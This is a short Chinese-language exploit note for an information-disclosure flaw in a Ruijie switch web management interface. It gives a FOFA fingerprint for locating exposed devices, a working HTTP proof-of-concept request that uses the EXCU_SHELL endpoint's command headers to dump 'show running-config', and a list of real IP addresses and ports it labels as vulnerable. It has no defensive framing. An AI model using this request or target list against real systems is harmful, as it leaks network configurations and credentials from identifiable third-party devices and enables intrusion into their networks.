# 锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞

    ## fofa

```
body="img/free_login_ge.gif" && body="./img/login_bg.gif"
```



## poc

```
GET /EXCU_SHELL HTTP/1.1
Host: 110.164.188.24:8093
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cmdnum: 1
Command1: show running-config
Confirm1: n
Accept-Encoding: gzip


```

## 漏洞列表

```
http://116.30.122.109:10034
http://120.197.181.245:8083
http://120.40.102.137:10080
http://14.212.203.61:2126
http://183.89.124.128:8092
http://183.89.124.128:8093
http://183.89.124.128:8094
http://183.89.124.128:8091
http://183.89.124.128:8099
http://183.89.124.128:8095
http://183.89.124.128:8097
http://183.89.124.128:8100
http://183.89.124.128:8096
http://183.89.124.128:8105
http://221.10.100.109:8084
http://221.207.224.186:8070
http://221.207.224.186:8071
http://221.207.224.186:8095
http://221.207.224.186:8097
http://222.64.147.7:8067
http://59.45.111.251:10000
http://60.165.53.178:8812
http://60.165.53.178:8814
```
